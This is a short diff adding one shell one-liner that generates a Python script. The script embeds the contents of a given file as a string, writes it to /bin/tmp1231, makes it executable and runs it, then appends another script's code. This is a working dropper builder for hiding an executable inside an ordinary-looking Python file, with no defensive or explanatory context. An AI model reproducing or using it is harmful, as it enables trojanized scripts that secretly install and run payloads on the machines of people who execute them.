@@ -1,0 +1,2 @@
+(printf "import os\ndata=r'''\n"&&cat $1 && echo "'''"&& printf "a=open('/bin/tmp1231','w+')\na.write(data)\na.close()\nos.system('chmod +x /bin/tmp1231 && tmp1231')\n" && cat $2) > $3
+
